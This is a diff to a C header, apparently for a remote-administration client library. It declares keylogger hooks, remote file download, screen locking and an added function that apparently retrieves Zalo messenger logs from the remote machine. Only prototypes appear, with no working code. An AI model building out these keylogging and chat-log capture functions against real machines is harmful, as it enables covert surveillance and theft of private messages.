@@ -56,7 +56,7 @@ DLLEXPORT void RestartServer();
 DLLEXPORT void HookKeylog();
 DLLEXPORT void UnhookKeylog();
 DLLEXPORT void GetKeylog();
-DLLEXPORT void GetNotificationHistory();
+DLLEXPORT const char* GetRemoteActiveWindow();
 
 // Thêm dòng này vào ClientLib.h
 DLLEXPORT void DownloadFile(const char* remotePath, const char* localPath);
@@ -64,5 +64,5 @@ DLLEXPORT void DownloadFile(const char* remotePath, const char* localPath);
 DLLEXPORT void ClearKeylogRemote();
 DLLEXPORT const char* GetSystemStats();
 DLLEXPORT void LockServer();
-
+DLLEXPORT const char* GetZaloLog();
 #endif // CLIENTLIB_H
